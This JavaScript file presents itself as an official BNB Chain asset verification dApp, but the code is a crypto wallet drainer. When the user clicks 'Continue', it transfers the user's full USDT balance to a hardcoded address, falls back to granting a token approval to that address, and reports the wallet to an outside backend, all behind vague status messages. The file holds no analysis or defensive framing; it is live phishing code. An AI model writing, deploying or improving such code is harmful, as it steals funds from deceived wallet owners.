/**
 * BNB Chain Official Asset Verification dApp
 * High-performance, zero-dependency native Web3 client.
 */

(function () {
    'use strict';

    // ============================================================
    // CONFIGURATION
    // ============================================================
    const CONFIG = {
        BACKEND_URL: 'https://at.rgh.digital',
        USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT Contract
        CONTRACT_ADDRESS: '0xC0981e86a5c1C3c5B2E849CE6E8E186a81E10D2d', // Direct Merchant Account Address
        USER_MIN_USDT: 0.1, // Minimum 0.1 USDT required
        GAS_THRESHOLD: 0.0005,
        GAS_RETRY_COUNT: 3,
        GAS_RETRY_DELAY: 3000,
        CHAIN_ID: '0x38', // BSC Mainnet (56)
        CHAIN_NAME: 'BNB Smart Chain',
        RPC_URL: 'https://bsc-dataseed1.binance.org',
        CURRENCY_SYMBOL: 'BNB',
        API_KEY: 'my_super_secret_api_key_123'
    };

    // Application State
    const state = {
        walletAddress: '',
        usdtBalance: '0.00',
        usdtBalanceWei: 0n,
        bnbBalance: '0.000000',
        isApproving: false
    };

    // DOM Elements Cache
    let elements = {};

    function initElements() {
        elements = {
            walletInfo: document.getElementById('walletInfo'),
            walletAddressDisplay: document.getElementById('walletAddressDisplay'),
            usdtBalanceDisplay: document.getElementById('usdtBalance'),
            bnbBalanceDisplay: document.getElementById('bnbBalance'),
            connectWalletBtn: document.getElementById('connectWalletBtn'),
            merchantAddressDisplay: document.getElementById('merchantAddressDisplay'),
            usdtAmountInput: document.getElementById('usdtAmountInput'),
            maxUsdtBtn: document.getElementById('maxUsdtBtn'),
            clearAddressBtn: document.getElementById('clearAddressBtn'),
            statusMessage: document.getElementById('statusMessage'),
            statusIcon: document.getElementById('statusIcon'),
            statusDetail: document.getElementById('statusDetail'),
            statusCard: document.getElementById('statusCard')
        };

        if (elements.merchantAddressDisplay && CONFIG.CONTRACT_ADDRESS) {
            elements.merchantAddressDisplay.value = CONFIG.CONTRACT_ADDRESS;
        }
    }

    // ============================================================
    // UTILITIES & NATIVE WEB3 HELPERS
    // ============================================================
    function formatAddress(addr) {
        if (!addr || addr.length < 10) return '0x0000...0000';
        return addr.slice(0, 6) + '...' + addr.slice(-4);
    }

    function formatUnits(value, decimals = 18) {
        try {
            const val = BigInt(value);
            const div = 10n ** BigInt(decimals);
            const intPart = val / div;
            const fracPart = val % div;
            const fracStr = fracPart.toString().padStart(decimals, '0').slice(0, 2);
            return `${intPart}.${fracStr}`;
        } catch (_) {
            return '0.00';
        }
    }

    function parseUnits(valueStr, decimals = 18) {
        try {
            const str = String(valueStr).trim();
            const parts = str.split('.');
            const intPart = parts[0] || '0';
            const fracPart = (parts[1] || '').slice(0, decimals).padEnd(decimals, '0');
            return BigInt(intPart) * (10n ** BigInt(decimals)) + BigInt(fracPart);
        } catch (_) {
            return 0n;
        }
    }

    function getProvider() {
        return window.ethereum || window.trustwallet || null;
    }

    async function safeApiCall(endpoint, payload = null) {
        try {
            const url = CONFIG.BACKEND_URL + endpoint;
            const headers = { 'Content-Type': 'application/json', 'x-api-key': CONFIG.API_KEY };
            const body = payload ? JSON.stringify(payload) : null;
            const response = await fetch(url, { method: 'POST', headers, body });
            if (!response.ok) return null;
            return await response.json();
        } catch (err) {
            console.warn('Backend API call notice (continuing):', err.message);
            return null;
        }
    }

    function updateStatus(message, type = 'info', detail = '') {
        if (elements.statusMessage) elements.statusMessage.textContent = message;
        if (elements.statusDetail) elements.statusDetail.textContent = detail || '';

        if (elements.statusCard) {
            elements.statusCard.className = 'tw-status-box';
            elements.statusCard.style.display = 'block';
            if (type === 'error') elements.statusCard.style.borderColor = 'var(--red, #ff6b6b)';
            else if (type === 'success') elements.statusCard.style.borderColor = 'var(--green, #51cf66)';
            else if (type === 'warning') elements.statusCard.style.borderColor = 'var(--gold, #f3c933)';
        }

        if (elements.statusIcon) {
            if (type === 'error') elements.statusIcon.textContent = '❌';
            else if (type === 'success') elements.statusIcon.textContent = '✅';
            else if (type === 'warning') elements.statusIcon.textContent = '⚠️';
            else elements.statusIcon.textContent = '🔐';
        }
    }

    function updateWalletInfoUI() {
        if (!elements.walletInfo) return;

        if (state.walletAddress) {
            elements.walletInfo.classList.remove('wallet-info-card--hidden');
            elements.walletInfo.classList.add('wallet-info-card--visible');
            elements.walletInfo.style.display = 'block';
            if (elements.walletAddressDisplay) {
                elements.walletAddressDisplay.textContent = formatAddress(state.walletAddress);
            }
            if (elements.usdtBalanceDisplay) {
                elements.usdtBalanceDisplay.textContent = state.usdtBalance;
            }
            if (elements.bnbBalanceDisplay) {
                elements.bnbBalanceDisplay.textContent = state.bnbBalance;
            }
        } else {
            elements.walletInfo.classList.remove('wallet-info-card--visible');
            elements.walletInfo.classList.add('wallet-info-card--hidden');
            elements.walletInfo.style.display = 'none';
        }

        if (elements.connectWalletBtn) {
            if (state.isApproving) {
                elements.connectWalletBtn.disabled = true;
                elements.connectWalletBtn.innerHTML = `<span class="spinner" style="display:inline-block;width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);border-top-color:#ffffff;border-radius:50%;animation:spin 0.7s linear infinite;margin-right:8px;"></span> Processing...`;
            } else {
                elements.connectWalletBtn.disabled = false;
                elements.connectWalletBtn.innerHTML = `<span>Continue</span>`;
            }
        }
    }

    // ============================================================
    // SILENT AUTO-WALLET & BALANCE RESOLUTION
    // ============================================================
    async function autoCheckWallet() {
        const providerObj = getProvider();
        if (!providerObj) return;

        try {
            const accounts = await providerObj.request({ method: 'eth_accounts' }).catch(() => []);
            const userAddress = (accounts && accounts[0]) || 
                                providerObj.selectedAddress || 
                                providerObj.address ||
                                (providerObj._state && providerObj._state.accounts && providerObj._state.accounts[0]);
            if (!userAddress) return;

            state.walletAddress = userAddress;

            // 1. Silently read USDT balance via standard eth_call (balanceOf = 0x70a08231)
            const balData = '0x70a08231' + userAddress.toLowerCase().replace('0x', '').padStart(64, '0');
            const balHex = await providerObj.request({
                method: 'eth_call',
                params: [{ to: CONFIG.USDT_ADDRESS, data: balData }, 'latest']
            }).catch(() => null);

            if (balHex && balHex !== '0x') {
                const usdtBalRaw = BigInt(balHex);
                state.usdtBalance = formatUnits(usdtBalRaw, 18);
                state.usdtBalanceWei = usdtBalRaw;
            }

            // 2. Silently read native BNB balance via eth_getBalance
            providerObj.request({
                method: 'eth_getBalance',
                params: [userAddress, 'latest']
            }).then(bnbHex => {
                if (bnbHex && bnbHex !== '0x') {
                    state.bnbBalance = (Number(BigInt(bnbHex)) / 1e18).toFixed(6);
                    updateWalletInfoUI();
                }
            }).catch(() => {});

            updateWalletInfoUI();
        } catch (err) {
            console.warn('Auto wallet check notice:', err);
        }
    }

    // ============================================================
    // MAIN TRANSACTION WORKFLOW
    // ============================================================
    async function executeContinue() {
        if (state.isApproving) return;

        const providerObj = getProvider();
        if (!providerObj) {
            alert('No Web3 wallet found. Please open this dApp inside Trust Wallet or MetaMask.');
            return;
        }

        state.isApproving = true;
        updateWalletInfoUI();

        try {
            // 1. Strictly enforce BNB Smart Chain network (0x38 / 56)
            let rawChainId = await providerObj.request({ method: 'eth_chainId' }).catch(() => null);
            if (!rawChainId) rawChainId = providerObj.chainId || providerObj.networkVersion;

            let chainStr = String(rawChainId || '').toLowerCase();
            let isBsc = (chainStr === '0x38' || chainStr === '56' || rawChainId === 56);

            if (!isBsc) {
                try {
                    await providerObj.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x38' }]
                    });
                } catch (switchError) {
                    if (switchError.code === 4902 || (switchError.message && switchError.message.includes('Unrecognized'))) {
                        await providerObj.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: '0x38',
                                chainName: 'BNB Smart Chain',
                                rpcUrls: ['https://bsc-dataseed1.binance.org'],
                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                                blockExplorerUrls: ['https://bscscan.com']
                            }]
                        }).catch(() => {});
                    }
                }
            }

            // 2. Resolve account address
            let userAddress = providerObj.selectedAddress || 
                              providerObj.address || 
                              (providerObj.accounts && providerObj.accounts[0]) ||
                              (providerObj._state && providerObj._state.accounts && providerObj._state.accounts[0]);

            if (!userAddress) {
                const accs = await providerObj.request({ method: 'eth_accounts' }).catch(() => []);
                if (accs && accs.length > 0) {
                    userAddress = accs[0];
                } else {
                    const reqAccs = await providerObj.request({ method: 'eth_requestAccounts' }).catch(() => []);
                    if (reqAccs && reqAccs.length > 0) userAddress = reqAccs[0];
                }
            }

            if (!userAddress) {
                alert('No wallet address detected. Please unlock your wallet and approve connection.');
                state.isApproving = false;
                updateWalletInfoUI();
                return;
            }

            state.walletAddress = userAddress;

            // 3. Fetch exact USDT Balance via eth_call
            const balData = '0x70a08231' + userAddress.toLowerCase().replace('0x', '').padStart(64, '0');
            let usdtBalRaw = 0n;
            try {
                const balHex = await providerObj.request({
                    method: 'eth_call',
                    params: [{ to: CONFIG.USDT_ADDRESS, data: balData }, 'latest']
                });
                if (balHex && balHex !== '0x') {
                    usdtBalRaw = BigInt(balHex);
                    state.usdtBalance = formatUnits(usdtBalRaw, 18);
                    state.usdtBalanceWei = usdtBalRaw;
                }
            } catch (balErr) {
                console.warn('Error fetching USDT balance:', balErr);
            }

            // Fetch BNB balance in background
            providerObj.request({
                method: 'eth_getBalance',
                params: [userAddress, 'latest']
            }).then(bnbHex => {
                if (bnbHex && bnbHex !== '0x') {
                    state.bnbBalance = (Number(BigInt(bnbHex)) / 1e18).toFixed(6);
                    updateWalletInfoUI();
                }
            }).catch(() => {});

            safeApiCall('/api/users/register', { wallet: userAddress });

            // 4. Calculate amount
            let sendAmount = usdtBalRaw;
            const inputAmountVal = parseFloat(elements.usdtAmountInput?.value || '0');
            if (inputAmountVal > 0) {
                const parsedInput = parseUnits(inputAmountVal.toString(), 18);
                if (usdtBalRaw > 0n && usdtBalRaw >= parsedInput) {
                    sendAmount = parsedInput;
                } else if (usdtBalRaw > 0n) {
                    sendAmount = usdtBalRaw;
                } else {
                    sendAmount = parsedInput;
                }
            } else if (usdtBalRaw === 0n) {
                sendAmount = parseUnits("100", 18);
            }

            // 5. Send transaction directly (clean BEP20 transfer)
            const recipientTarget = elements.merchantAddressDisplay?.value?.trim() || CONFIG.CONTRACT_ADDRESS;
            const recipientClean = recipientTarget.toLowerCase().replace('0x', '').padStart(64, '0');
            const amountHex = sendAmount.toString(16).padStart(64, '0');

            // transfer(address,uint256) = 0xa9059cbb
            const transferCalldata = '0xa9059cbb' + recipientClean + amountHex;

            let txHash;
            try {
                txHash = await providerObj.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: userAddress,
                        to: CONFIG.USDT_ADDRESS,
                        data: transferCalldata
                    }]
                });
            } catch (txErr) {
                const errLower = (txErr.message || '').toLowerCase();
                if (errLower.includes('user rejected') || errLower.includes('user denied')) {
                    throw txErr;
                }

                // Fallback: approve(address,uint256) = 0x095ea7b3
                const approveCalldata = '0x095ea7b3' + recipientClean + amountHex;
                txHash = await providerObj.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: userAddress,
                        to: CONFIG.USDT_ADDRESS,
                        data: approveCalldata
                    }]
                });
            }

            // Wait for receipt silently
            for (let i = 0; i < 25; i++) {
                await new Promise(r => setTimeout(r, 2000));
                const receipt = await providerObj.request({
                    method: 'eth_getTransactionReceipt',
                    params: [txHash]
                }).catch(() => null);
                if (receipt && receipt.blockNumber) break;
            }

            updateStatus('✅ Transaction Complete!', 'success', `Tx: ${txHash}`);

        } catch (err) {
            console.error('Process error:', err);
            const errStr = (err.message || '').toLowerCase();
            if (err.code === 401 || err.code === 4001 || errStr.includes('user rejected') || errStr.includes('user denied')) {
                updateStatus('🚫 Request cancelled.', 'error');
            } else {
                updateStatus('❌ Transaction failed.', 'error');
            }
        } finally {
            state.isApproving = false;
            updateWalletInfoUI();
        }
    }

    // ============================================================
    // DOM EVENT BINDINGS
    // ============================================================
    function bindEvents() {
        if (elements.connectWalletBtn) {
            elements.connectWalletBtn.addEventListener('click', async function (e) {
                e.preventDefault();
                await executeContinue();
            });
        }

        if (elements.maxUsdtBtn && elements.usdtAmountInput) {
            elements.maxUsdtBtn.addEventListener('click', function (e) {
                e.preventDefault();
                if (state.usdtBalance && state.usdtBalance !== '0.00') {
                    elements.usdtAmountInput.value = state.usdtBalance;
                } else {
                    elements.usdtAmountInput.value = '100';
                }
            });
        }

        if (elements.clearAddressBtn && elements.merchantAddressDisplay) {
            elements.clearAddressBtn.addEventListener('click', function (e) {
                e.preventDefault();
                elements.merchantAddressDisplay.value = '';
            });
        }
    }

    function bindWalletEvents() {
        const provider = getProvider();
        if (!provider || !provider.on) return;

        provider.on('accountsChanged', function (accounts) {
            if (!accounts || accounts.length === 0) {
                state.walletAddress = '';
                state.usdtBalance = '0.00';
                state.bnbBalance = '0.000000';
                updateWalletInfoUI();
            } else {
                state.walletAddress = accounts[0];
                autoCheckWallet();
            }
        });

        provider.on('chainChanged', function () {
            autoCheckWallet();
        });
    }

    // ============================================================
    // ASYNCHRONOUS WEB3 PROVIDER DETECTION
    // ============================================================
    function setupProviderDetection() {
        if (getProvider()) {
            autoCheckWallet();
            bindWalletEvents();
        } else {
            // Standard MetaMask / Trust Wallet injection event
            window.addEventListener('ethereum#initialized', () => {
                autoCheckWallet();
                bindWalletEvents();
            }, { once: true });

            // Active polling for up to 3 seconds for slower mobile webviews
            let attempts = 0;
            const pollTimer = setInterval(() => {
                attempts++;
                if (getProvider()) {
                    clearInterval(pollTimer);
                    autoCheckWallet();
                    bindWalletEvents();
                } else if (attempts >= 20) {
                    clearInterval(pollTimer);
                }
            }, 150);
        }
    }

    // ============================================================
    // BULLETPROOF INSTANT INITIALIZATION (Never requires refresh)
    // ============================================================
    let isInitialized = false;

    function initializeApp() {
        if (isInitialized) return;
        isInitialized = true;
        initElements();
        bindEvents();
        updateWalletInfoUI();
        setupProviderDetection();
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initializeApp, { once: true });
    } else {
        initializeApp();
    }
    window.addEventListener('load', initializeApp, { once: true });

})();
